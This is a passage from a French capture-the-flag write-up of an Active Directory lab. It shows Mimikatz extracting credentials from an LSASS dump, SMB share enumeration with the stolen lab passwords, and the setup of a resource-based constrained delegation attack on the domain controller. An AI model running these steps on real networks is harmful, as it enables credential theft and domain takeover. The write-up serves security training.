</span></span></code></pre></td></tr></table></div></div><p><img class=lazyload src=/maki.bzh/svg/loading.min.svg data-src=/lib/images/writeups/2019_wonkachallenge/step6_smbtransfer.png data-srcset="/lib/images/writeups/2019_wonkachallenge/step6_smbtransfer.png, /lib/images/writeups/2019_wonkachallenge/step6_smbtransfer.png 1.5x, /lib/images/writeups/2019_wonkachallenge/step6_smbtransfer.png 2x" data-sizes=auto alt=/lib/images/writeups/2019_wonkachallenge/step6_smbtransfer.png title=/lib/images/writeups/2019_wonkachallenge/step6_smbtransfer.png></p><p>Le minidump est disponible ici : <a href=https://mega.nz/#!bj4h1ISB!17pQuX17K8gvMRlBZYsuphDtHhYE07G1x-nyT1OPGVY target=_blank rel="noopener noreffer">https://mega.nz/#!bj4h1ISB!17pQuX17K8gvMRlBZYsuphDtHhYE07G1x-nyT1OPGVY</a></p><h3 id=vi3-récupération-des-mots-de-passe-dans-le-minidump>VI.3. Récupération des mots de passe dans le minidump</h3><p>Comme mentionné précédemment, <strong>Mimikatz</strong> est capable de lire un minidump en local. C&rsquo;est à ce moment que CommandoVM entre en jeu.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=o>(</span>CommandoVM<span class=o>)</span> ➜ .<span class=se>\m</span>imikatz.exe
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># privilege::debug</span>
</span></span><span class=line><span class=cl>Privilege <span class=s1>&#39;20&#39;</span> OK
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># sekurlsa::Minidump lsassdump.dmp</span>
</span></span><span class=line><span class=cl>Switch to MINIDUMP : <span class=s1>&#39;lsassdump.dmp&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># sekurlsa::logonPasswords</span>
</span></span><span class=line><span class=cl>Opening : <span class=s1>&#39;lsassdump.dmp&#39;</span> file <span class=k>for</span> minidump...
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>[</span>...<span class=o>]</span>
</span></span><span class=line><span class=cl>Authentication Id : <span class=m>0</span> <span class=p>;</span> <span class=m>999</span> <span class=o>(</span>00000000:000003e7<span class=o>)</span>
</span></span><span class=line><span class=cl>Session           : UndefinedLogonType from <span class=m>0</span>
</span></span><span class=line><span class=cl>User Name         : SRV01-INTRANET$
</span></span><span class=line><span class=cl>Domain            : FACTORY
</span></span><span class=line><span class=cl>Logon Server      : <span class=o>(</span>null<span class=o>)</span>
</span></span><span class=line><span class=cl>Logon Time        : 05/07/2019 12:16:10
</span></span><span class=line><span class=cl>SID               : S-1-5-18
</span></span><span class=line><span class=cl>        msv :
</span></span><span class=line><span class=cl>        tspkg :
</span></span><span class=line><span class=cl>        wdigest :
</span></span><span class=line><span class=cl>         * Username : SRV01-INTRANET$
</span></span><span class=line><span class=cl>         * Domain   : FACTORY
</span></span><span class=line><span class=cl>         * Password : <span class=o>(</span>null<span class=o>)</span>
</span></span><span class=line><span class=cl>        kerberos :
</span></span><span class=line><span class=cl>         * Username : srv01-intranet$
</span></span><span class=line><span class=cl>         * Domain   : FACTORY.LAN
</span></span><span class=line><span class=cl>         * Password : <span class=o>(</span>null<span class=o>)</span>
</span></span><span class=line><span class=cl>        ssp :
</span></span><span class=line><span class=cl>        credman :
</span></span><span class=line><span class=cl>         <span class=o>[</span>00000000<span class=o>]</span>
</span></span><span class=line><span class=cl>         * Username : factory.lan<span class=se>\a</span>dminServer
</span></span><span class=line><span class=cl>         * Domain   : 172.16.42.101
</span></span><span class=line><span class=cl>         * Password : <span class=c1>#3LLe!!estOuL@Poulette</span>
</span></span></code></pre></td></tr></table></div></div><p>Pour des soucis de lisibilité, la sortie de Mimikatz a été tronquée. Les identifiants récupérés sont :</p><blockquote><p>factory.lan\adminServer : #3LLe!!estOuL@Poulette</p></blockquote><h3 id=vi4-flag>VI.4. Flag</h3><blockquote><p>87950cf8267662a3b26460b38a07f0e2f203539676f4a88a7c572a596140ade4</p></blockquote><hr><h3 id=resources-4>Resources</h3><ol><li><strong>sevagas</strong>, <em>swap_digger</em>, GitHub : <a href=https://github.com/sevagas/swap_digger target=_blank rel="noopener noreffer">https://github.com/sevagas/swap_digger</a></li><li><strong>Microsoft</strong>, <em>Windows Sysinternals</em>, Documentation Microsoft : <a href=https://docs.microsoft.com/en-us/sysinternals/ target=_blank rel="noopener noreffer">https://docs.microsoft.com/en-us/sysinternals/</a></li><li><strong>Sebastien Macke - @lanjelot</strong>, <em>Dumping Windows Credentials</em>, securusglobal : <a href=https://www.securusglobal.com/community/2013/12/20/dumping-windows-credentials/ target=_blank rel="noopener noreffer">https://www.securusglobal.com/community/2013/12/20/dumping-windows-credentials/</a></li><li><strong>cyberarms</strong>, <em>Grabbing Passwords from Memory using Procdump and Mimikatz</em>, cyberarms : <a href=https://cyberarms.wordpress.com/2015/03/16/grabbing-passwords-from-memory-using-procdump-and-mimikatz/ target=_blank rel="noopener noreffer">https://cyberarms.wordpress.com/2015/03/16/grabbing-passwords-from-memory-using-procdump-and-mimikatz/</a></li><li><strong>ired.team</strong>, <em>Credential Access & Dumping</em>, ired.team : <a href=https://ired.team/offensive-security/credential-access-and-credential-dumping target=_blank rel="noopener noreffer">https://ired.team/offensive-security/credential-access-and-credential-dumping</a></li><li><strong>Mark Russinovich and Andrew Richards</strong>, <em>ProcDump v9.0</em>, Documentation Microsoft : <a href=https://docs.microsoft.com/en-us/sysinternals/downloads/procdump target=_blank rel="noopener noreffer">https://docs.microsoft.com/en-us/sysinternals/downloads/procdump</a></li></ol><hr><hr><h2 id=vii-step-7---spreading-love>VII. Step 7 - Spreading love</h2><blockquote><p>Sharing is caring ;)</p></blockquote><h3 id=tldr-6>TL;DR</h3><ol><li>Essayer d&rsquo;accéder aux partages du réseau avec les identifiants récupérés ;</li><li>Trouver le partage <strong>Users</strong> sur le serveur <code>172.16.42.5</code> ;</li><li>Le parcourir et trouver les identifiants : <code>factory.lan\SvcJoinComputerToDom : QueStC3qU!esTpetItEtMarr0N?</code>.</li></ol><hr><h3 id=vii1-reconnaissance>VII.1. Reconnaissance</h3><p>Dans les scans réalisés lors de l&rsquo;étape 5 (cf. V.1. Reconnaissance), on remarque que toutes les machines ont le port SMB (445/tcp) ouvert. Les connexions anonymes ayant échoué, on peut réitérer les tests avec les identifiants de <strong>adminServer</strong>.</p><p>L&rsquo;outil <strong>CrackMapExec</strong> (CME) est pratique lors de tests internes avec de nombreuses machines. Il permet par exemple de lister les partages de toute une plage d&rsquo;IP :</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=o>(</span>KaliVM<span class=o>)</span> ➜ cme smb ./ip_list -u <span class=s1>&#39;adminServer&#39;</span> -p <span class=s1>&#39;#3LLe!!estOuL@Poulette&#39;</span> -d <span class=s1>&#39;factory.lan&#39;</span> --shares 
</span></span><span class=line><span class=cl>SMB         172.16.42.5     <span class=m>445</span>    DC01-WW2         <span class=o>[</span>*<span class=o>]</span> Windows 10.0 Build <span class=m>17763</span> x64 <span class=o>(</span>name:DC01-WW2<span class=o>)</span> <span class=o>(</span>domain:factory.lan<span class=o>)</span> <span class=o>(</span>signing:True<span class=o>)</span> <span class=o>(</span>SMBv1:False<span class=o>)</span>
</span></span><span class=line><span class=cl>SMB         172.16.42.101   <span class=m>445</span>    PC01-DEV         <span class=o>[</span>*<span class=o>]</span> Windows 10.0 Build <span class=m>18362</span> x64 <span class=o>(</span>name:PC01-DEV<span class=o>)</span> <span class=o>(</span>domain:factory.lan<span class=o>)</span> <span class=o>(</span>signing:False<span class=o>)</span> <span class=o>(</span>SMBv1:False<span class=o>)</span>
</span></span><span class=line><span class=cl>SMB         172.16.42.5     <span class=m>445</span>    DC01-WW2         <span class=o>[</span>+<span class=o>]</span> factory.lan<span class=se>\a</span>dminServer:#3LLe!!estOuL@Poulette 
</span></span><span class=line><span class=cl>SMB         172.16.42.101   <span class=m>445</span>    PC01-DEV         <span class=o>[</span>+<span class=o>]</span> factory.lan<span class=se>\a</span>dminServer:#3LLe!!estOuL@Poulette 
</span></span><span class=line><span class=cl>SMB         172.16.42.101   <span class=m>445</span>    PC01-DEV         <span class=o>[</span>+<span class=o>]</span> Enumerated shares
</span></span><span class=line><span class=cl>SMB         172.16.42.101   <span class=m>445</span>    PC01-DEV         Share           Permissions     Remark
</span></span><span class=line><span class=cl>SMB         172.16.42.101   <span class=m>445</span>    PC01-DEV         -----           -----------     ------
</span></span><span class=line><span class=cl>SMB         172.16.42.101   <span class=m>445</span>    PC01-DEV         ADMIN$                          Remote Admin
</span></span><span class=line><span class=cl>SMB         172.16.42.101   <span class=m>445</span>    PC01-DEV         C$                              Default share
</span></span><span class=line><span class=cl>SMB         172.16.42.101   <span class=m>445</span>    PC01-DEV         IPC$            READ            Remote IPC
</span></span><span class=line><span class=cl>SMB         172.16.42.101   <span class=m>445</span>    PC01-DEV         Users                           
</span></span><span class=line><span class=cl>SMB         172.16.42.5     <span class=m>445</span>    DC01-WW2         <span class=o>[</span>+<span class=o>]</span> Enumerated shares
</span></span><span class=line><span class=cl>SMB         172.16.42.5     <span class=m>445</span>    DC01-WW2         Share           Permissions     Remark
</span></span><span class=line><span class=cl>SMB         172.16.42.5     <span class=m>445</span>    DC01-WW2         -----           -----------     ------
</span></span><span class=line><span class=cl>SMB         172.16.42.5     <span class=m>445</span>    DC01-WW2         ADMIN$                          Remote Admin
</span></span><span class=line><span class=cl>SMB         172.16.42.5     <span class=m>445</span>    DC01-WW2         C$                              Default share
</span></span><span class=line><span class=cl>SMB         172.16.42.5     <span class=m>445</span>    DC01-WW2         IPC$            READ            Remote IPC
</span></span><span class=line><span class=cl>SMB         172.16.42.5     <span class=m>445</span>    DC01-WW2         NETLOGON        READ            Logon server share 
</span></span><span class=line><span class=cl>SMB         172.16.42.5     <span class=m>445</span>    DC01-WW2         provisioning    READ            
</span></span><span class=line><span class=cl>SMB         172.16.42.5     <span class=m>445</span>    DC01-WW2         SYSVOL          READ            Logon server share 
</span></span><span class=line><span class=cl>SMB         172.16.42.5     <span class=m>445</span>    DC01-WW2         Users           READ            
</span></span></code></pre></td></tr></table></div></div><p>L&rsquo;adresse <em>172.16.42.11</em> ne répond pas sur son port SMB. Cependant, un partage <strong>Users</strong> est accessible en lecture sur <em>172.16.42.5</em> (DC01-WW2).</p><h3 id=vii2-mount-users-share>VII.2. Mount Users share</h3><p>Il est possible de se connecter au partage via <code>smbclient</code> :</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=o>(</span>KaliVM<span class=o>)</span> ➜ smbclient -U <span class=s1>&#39;adminServer%#3LLe!!estOuL@Poulette&#39;</span> -W <span class=s2>&#34;factory.lan&#34;</span> //172.16.42.5/Users
</span></span><span class=line><span class=cl>WARNING: The <span class=s2>&#34;syslog&#34;</span> option is deprecated
</span></span><span class=line><span class=cl>Try <span class=s2>&#34;help&#34;</span> to get a list of possible commands.
</span></span><span class=line><span class=cl>smb: <span class=se>\&gt;</span> ls
</span></span><span class=line><span class=cl>  .                                  DR        <span class=m>0</span>  Wed Jun <span class=m>19</span> 23:00:08 <span class=m>2019</span>
</span></span><span class=line><span class=cl>  ..                                 DR        <span class=m>0</span>  Wed Jun <span class=m>19</span> 23:00:08 <span class=m>2019</span>
</span></span><span class=line><span class=cl>  Administrator                       D        <span class=m>0</span>  Wed Jun <span class=m>19</span> 23:00:35 <span class=m>2019</span>
</span></span><span class=line><span class=cl>  Default                           DHR        <span class=m>0</span>  Wed Jun <span class=m>19</span> 22:52:35 <span class=m>2019</span>
</span></span><span class=line><span class=cl>  desktop.ini                       AHS      <span class=m>174</span>  Sat Sep <span class=m>15</span> 09:16:48 <span class=m>2018</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>		<span class=m>12966143</span> blocks of size 4096. <span class=m>9273442</span> blocks available
</span></span></code></pre></td></tr></table></div></div><p>Il est également possible de le monter en local. D&rsquo;un point de vue personnel, je préfère cette méthode car je trouve qu&rsquo;elle rend plus simple la navigation dans le partage :</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=o>(</span>KaliVM<span class=o>)</span> ➜ mkdir /tmp/a
</span></span><span class=line><span class=cl><span class=o>(</span>KaliVM<span class=o>)</span> ➜ sudo mount -t cifs -o <span class=nv>username</span><span class=o>=</span>adminServer,password<span class=o>=</span><span class=s1>&#39;#3LLe!!estOuL@Poulette&#39;</span> //172.16.42.5/Users a
</span></span><span class=line><span class=cl><span class=o>(</span>KaliVM<span class=o>)</span> ➜ ls /tmp/a
</span></span><span class=line><span class=cl>Administrator   Default   desktop.ini
</span></span><span class=line><span class=cl><span class=o>(</span>KaliVM<span class=o>)</span> ➜ tree Administrator 
</span></span><span class=line><span class=cl>Administrator
</span></span><span class=line><span class=cl>└── Documents
</span></span><span class=line><span class=cl>    └── provisioning
</span></span><span class=line><span class=cl>        ├── credentials.txt
</span></span><span class=line><span class=cl>        └── flag-07.txt
</span></span></code></pre></td></tr></table></div></div><p>Le fichier <strong>credentials.txt</strong> à côté du flag sera utile pour la suite, car il contient de nouveaux identifiants :</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1>#####</span>
</span></span><span class=line><span class=cl><span class=c1>## Provisioning Account</span>
</span></span><span class=line><span class=cl><span class=c1>####</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>This account is used only <span class=k>for</span> joining machines <span class=o>(</span>servers <span class=p>&amp;</span> workstations<span class=o>)</span> to domain.
</span></span><span class=line><span class=cl>We created it to <span class=s2>&#34;delegate&#34;</span> this right to servers and workstations admins since we have disabled
</span></span><span class=line><span class=cl>this right <span class=k>for</span> regular users and we <span class=k>do</span> not want to give domain admin rights to
</span></span><span class=line><span class=cl>servers administrators and workstation administrators.
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>factory.lan<span class=se>\S</span>vcJoinComputerToDom
</span></span><span class=line><span class=cl>QueStC3qU!esTpetItEtMarr0N?
</span></span></code></pre></td></tr></table></div></div><h3 id=vii3-flag>VII.3. Flag</h3><blockquote><p>5FFECA75938FA8E5D7FCB436451DA1BC4713DCD94DD6F57F2DF50E035039AB0C</p></blockquote><hr><h3 id=resources-5>Resources</h3><ol><li><strong>ShawnDEvans</strong>, <em>SMBmap</em>, GitHub : <a href=https://github.com/ShawnDEvans/smbmap target=_blank rel="noopener noreffer">https://github.com/ShawnDEvans/smbmap</a></li><li><strong>Mickael Dorigny</strong>, <em>Monter un partage CIFS sous Linux</em>, it-connect : <a href=https://www.it-connect.fr/monter-un-partage-cifs-sous-linux/ target=_blank rel="noopener noreffer">https://www.it-connect.fr/monter-un-partage-cifs-sous-linux/</a></li></ol><hr><hr><h2 id=viii-step-8---wagging-the-dogs>VIII. Step 8 - Wagging the dogs</h2><blockquote><p>SHA256(NTLM(krbtgt))</p></blockquote><h3 id=tldr-7>TL;DR</h3><ol><li>Faire un <code>bloodhound</code> avec le compte <strong>adminServer</strong> ;</li><li>Remarquer la relation <strong>AddAllowedToAct</strong> entre <em>DC01-WW2.FACTORY.LAN</em> et <em>SvcJoinComputerToDom</em> ;</li><li>Grâce à la note précédente et à la relation trouvée, comprendre qu&rsquo;il faut abuser du <strong>resources based constrained delegation</strong> ;</li><li>Ajouter de la CommandoVM dans le domaine grâce au compte de service (<em>SvcJoinComputerToDom</em>) ;</li><li>Créer un SPN et modifier sa valeur de <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code> ;</li><li>Abuser du mécanisme <strong>S4U</strong> (<em>S4U2User</em> et <em>S4U2Proxy</em>) avec Rubeus pour usurper l&rsquo;identité de l&rsquo;administrateur de domaine ;</li><li>Lorsque Rubeus a forgé le ticket de l&rsquo;administrateur, utiliser <strong>psexec</strong> sur le contrôleur de domaine ;</li><li>Extraire le <code>ntds.dit</code> en utilisant <code>vssadmin</code> sur le contrôleur de domaine ;</li><li>Copier le fichier généré sur une de nos machines et utiliser <strong>secretdumps.py</strong> afin de récupérer les différents hash, dont celui de <code>krbtgt</code>.</li></ol><hr><h3 id=viii1-reconnaissance>VIII.1. Reconnaissance</h3><p>Cette étape est sûrement la plus difficile du challenge. À ce stade, il y a deux comptes disponibles : un compte utilisateur du domaine (<em>adminServer</em>) et un compte de service (<em>SvcJoinComputerToDom</em>).</p><p>La première idée consiste à faire un bloodhound avec le compte utilisateur du domaine. <strong>Bloodhound</strong> est un outil de cartographie d&rsquo;Active Directory. Il permet de visualiser le domaine sous forme de graphes et de voir les différentes relations entre les objets du domaine (utilisateurs, machines, groupes &mldr;). De plus, il permet de distinguer les faiblesses du domaine et donne des informations pratiques pour les exploiter.</p><p><em>Note</em> : Le dépôt GitHub est souvent mis à jour, embarquant de nouvelles fonctionnalités. Ne pas oublier de récupérer la dernière version avant de partir en test interne.</p><p><em>BloodHound</em> permet de visualiser les données, mais le collecteur s&rsquo;appelle <strong>SharpHound</strong>. Il se situe dans le même dépôt, dans le dossier &ldquo;Ingestors&rdquo;. Avant de l&rsquo;utiliser, il faut ajouter l&rsquo;adresse IP du contrôleur de domaine en tant que serveur DNS principal afin de pouvoir accéder au domaine :</p><p><img class=lazyload src=/maki.bzh/svg/loading.min.svg data-src=/lib/images/writeups/2019_wonkachallenge/step8_dns.png data-srcset="/lib/images/writeups/2019_wonkachallenge/step8_dns.png, /lib/images/writeups/2019_wonkachallenge/step8_dns.png 1.5x, /lib/images/writeups/2019_wonkachallenge/step8_dns.png 2x" data-sizes=auto alt=/lib/images/writeups/2019_wonkachallenge/step8_dns.png title=/lib/images/writeups/2019_wonkachallenge/step8_dns.png></p><p><em>Note</em> : Comme présenté sur le schéma dans l&rsquo;introduction, CommandoVM est configuré en NAT. La seconde IP correspond à l&rsquo;IP de mon hôte sur l&rsquo;interface virtuelle.</p><h4 id=viii1a-bloodhound>VIII.1.a BloodHound</h4><p>Lorsque cette étape est réalisée, <em>CommandoVM</em> est en mesure de ping le domaine <code>factory.lan</code>. <em>SharpHound</em> peut alors être executé à l&rsquo;aide de la commande suivante :</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=o>(</span>CommandoVM<span class=o>)</span> ➜ .<span class=se>\S</span>harpHound.exe --Domain factory.lan --DomainController 172.16.42.5 --LDAPUser adminServer --LDAPPass <span class=s1>&#39;#3LLe!!estOuL@Poulette&#39;</span> --CollectionMethod All,GPOLocalGroup,LoggedOn
</span></span></code></pre></td></tr></table></div></div><p>Le fichier zip contenant les informations sera créé dans le dossier courant. En visualisant les données récupérées, deux éléments sont intéressants :</p><ul><li>Il n&rsquo;y a qu&rsquo;un seul et unique administrateur de domaine <strong>Administrator</strong> ;</li><li>Une relation <strong>AddAllowedToAct</strong> est présente entre le contrôleur de domaine (<em>DC01-WW2.FACTORY.LAN</em>) et le compte (<em>SvcJoinComputerToDom</em>).</li></ul><p>Cette relation est mentionnée sur le blog de <em>CptJesus</em>. Le blogpost montre l&rsquo;introduction de nouvelles primitives d&rsquo;attaques : AddAllowedToAct/AllowedToAct. Ces primitives sont utilisées pour identifier l&rsquo;attaque <strong>Resource Based Constrained Delegation</strong> (RBCD).</p><h4 id=viii1b-resource-based-constrained-delegation---explication>VIII.1.b Resource Based Constrained Delegation - Explication</h4><p>Pour reprendre ce qu&rsquo;a dit <strong>Pixis</strong> sur son blog au sujet de cette attaque (cf. Ressource 4 : <em>Resource-Based Constrained Delegation - Risques</em>) :</p><blockquote><p>Contrairement à la délégation complète, la délégation Resource-Based est un poil plus compliquée. L’idée générale est que ce sont les ressources de fin de chaîne qui décident si oui ou non un service peut s’authentifier auprès d’elles en tant qu’un autre utilisateur. Ces ressources ont donc une liste de comptes en lesquels elles ont confiance. Si une ressource fait confiance au compte WEBSERVER$, alors quand un utilisateur s’authentifiera auprès de WEBSERVER$, il pourra lui même s’authentifier auprès de cette ressource en tant que l’utilisateur.</p></blockquote><p>La ressource finale, s&rsquo;occupant de l&rsquo;authentification, utilise une &ldquo;whitelist&rdquo;. Cette liste contient tous les comptes de confiance et est stockée dans un attribut appelé <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code>. Toujours en paraphrasant l&rsquo;article de <strong>Pixis</strong>, dans le cas où un utilisateur s&rsquo;authentifierait sans utiliser Kerberos, alors le compte de service censé &ldquo;impersonate&rdquo; l&rsquo;utilisateur n&rsquo;aurait pas de TGS. C&rsquo;est à ce moment que le compte de service fait une demande de TGS au nom de l&rsquo;utilisateur désirant se connecter au KDC. Ce mécanisme s&rsquo;appelle le <strong>S4U2Self</strong>. Si le TGS de l&rsquo;utilisateur est correctement reçu, il peut alors accéder à la ressource grâce au mécanisme <strong>S4U2Proxy</strong>.</p><p>Cependant, si un compte machine fait la demande d&rsquo;un TGS sans l&rsquo;attribut <code>TrustedToAuthForDelegation</code>, alors le TGS reçu sera <em>non transférable</em>. Malgré tout, lors de la demande de TGS pour une ressource via <strong>S4U2Proxy</strong>, cette demande sera validée.</p><p>J&rsquo;invite toutes les personnes intéressées par ce genre d&rsquo;attaque à lire les articles de <strong>Pixis</strong> sur <em>hackndo.com</em>, <strong>SpecterOps</strong>, <strong>harmj0y</strong> et <strong>shenaniganslabs</strong>. Les différents liens sont disponibles dans les ressources.</p><p>Ayant tout ceci en tête, l&rsquo;article de <em>CptJesus</em> semble plus clair. Ce même article mentionne deux conditions pour réussir ce genre d&rsquo;attaque :</p><ol><li>Pouvoir réécrire l&rsquo;attribut <code>msds-AllowedToActOnBehalfOfOtherIdentity</code>, contenant les comptes de confiance ;</li><li>Contrôler un utilisateur avec un <strong>ServicePrincipalName</strong> (SPN) mis en place.</li></ol><p>Cette attaque va permettre d&rsquo;accéder au contrôleur de domaine en tant qu&rsquo;administrateur de domaine.</p><p>Dans notre cas, ces prérequis sont remplis. La relation que BloodHound a trouvé entre <em>DC01-WW2.FACTORY.LAN</em> et <em>SvcJoinComputerToDom</em> permet de réécrire l&rsquo;attribut <code>msds-AllowedToActOnBehalfOfOtherIdentity</code>. Quant au contrôle d&rsquo;un utilisateur ayant un SPN configuré, il faudrait ajouter une machine au domaine. En se basant sur la note <strong>credentials.txt</strong>, on sait que le compte <em>SvcJoinComputerToDom</em> possède cette fonction.</p><h3 id=viii2-mise-en-place-de-lexploitation>VIII.2. Mise en place de l&rsquo;exploitation</h3><p>La reconnaissance étant terminée, le moment est venu d&rsquo;exploiter cette vulnérabilité. Tout d&rsquo;abord, il convient d&rsquo;ajouter notre CommandoVM au domaine grâce au compte <em>SvcJoinComputerToDom</em> :</p><p><img class=lazyload src=/maki.bzh/svg/loading.min.svg data-src=/lib/images/writeups/2019_wonkachallenge/step8_connect2dom.png data-srcset="/lib/images/writeups/2019_wonkachallenge/step8_connect2dom.png, /lib/images/writeups/2019_wonkachallenge/step8_connect2dom.png 1.5x, /lib/images/writeups/2019_wonkachallenge/step8_connect2dom.png 2x" data-sizes=auto alt=/lib/images/writeups/2019_wonkachallenge/step8_connect2dom.png title=/lib/images/writeups/2019_wonkachallenge/step8_connect2dom.png></p><p><em>Note</em> : Lorsque que l&rsquo;ajout de la machine a été validé par le domaine, notre Windows nous demande de choisir un type de compte pour <em>SvcJoinComputerToDom</em>. Pour être sûr de ne pas être embêté, j&rsquo;ai choisi de le mettre en administrateur local.</p><p>Pour s&rsquo;assurer que CommandoVM est correctement relié au domaine, il suffit de lister les utilisateurs du domaine à l&rsquo;aide de la commande suivante : <code>net user /dom</code></p><p><img class=lazyload src=/maki.bzh/svg/loading.min.svg data-src=/lib/images/writeups/2019_wonkachallenge/step8_domainuser.png data-srcset="/lib/images/writeups/2019_wonkachallenge/step8_domainuser.png, /lib/images/writeups/2019_wonkachallenge/step8_domainuser.png 1.5x, /lib/images/writeups/2019_wonkachallenge/step8_domainuser.png 2x" data-sizes=auto alt=/lib/images/writeups/2019_wonkachallenge/step8_domainuser.png title=/lib/images/writeups/2019_wonkachallenge/step8_domainuser.png></p><p>Harmj0y a écrit un <a href=https://www.harmj0y.net/blog/activedirectory/a-case-study-in-wagging-the-dog-computer-takeover/ target=_blank rel="noopener noreffer">article</a> détaillé sur cette attaque et a même fournit un <a href=https://gist.github.com/HarmJ0y/224dbfef83febdaf885a8451e40d52ff target=_blank rel="noopener noreffer">script</a> en powershell pour l&rsquo;automatiser. Son script a besoin de deux librairies pour fonctionner : <a href=https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 target=_blank rel="noopener noreffer">PowerView dans la branche dev</a> et <a href=https://raw.githubusercontent.com/Kevin-Robertson/Powermad/master/Powermad.ps1 target=_blank rel="noopener noreffer">PowerMad</a>.</p><h4 id=viii2a-vérification-des-droits-sur-le-domaine>VIII.2.a. Vérification des droits sur le domaine</h4><p>Avant de commencer l&rsquo;exploitation à proprement parler, il est préférable de vérifier si l&rsquo;utilisateur <strong>SvcJoinComputerToDom</strong> possède les droits permettant l&rsquo;exploitation de cette délégation :</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=o>(</span>CommandoVM<span class=o>)</span> ➜ Import-Module .<span class=se>\p</span>owermad.ps1
</span></span><span class=line><span class=cl><span class=o>(</span>CommandoVM<span class=o>)</span> ➜ Import-Module .<span class=se>\p</span>owerview.ps1
</span></span><span class=line><span class=cl><span class=o>(</span>CommandoVM<span class=o>)</span> ➜ <span class=nv>$AttackerSID</span> <span class=o>=</span> Get-DomainUser SvcJoinComputerToDom -Properties objectsid <span class=p>|</span> Select -Expand objectsid
</span></span><span class=line><span class=cl><span class=o>(</span>CommandoVM<span class=o>)</span> ➜ <span class=nv>$ACE</span> <span class=o>=</span> Get-DomainObjectACL dc01-ww2.factory.lan <span class=p>|</span> ?<span class=o>{</span><span class=nv>$_</span>.SecurityIdentifier -match <span class=nv>$AttackerSID</span><span class=o>}</span>
</span></span><span class=line><span class=cl><span class=o>(</span>CommandoVM<span class=o>)</span> ➜ <span class=nv>$ACE</span>
</span></span><span class=line><span class=cl><span class=o>(</span>CommandoVM<span class=o>)</span> ➜ ConvertFrom-SID <span class=nv>$ACE</span>.SecurityIdentifier
</span></span><span class=line><span class=cl>FACTORY<span class=se>\S</span>vcJoinComputerToDom
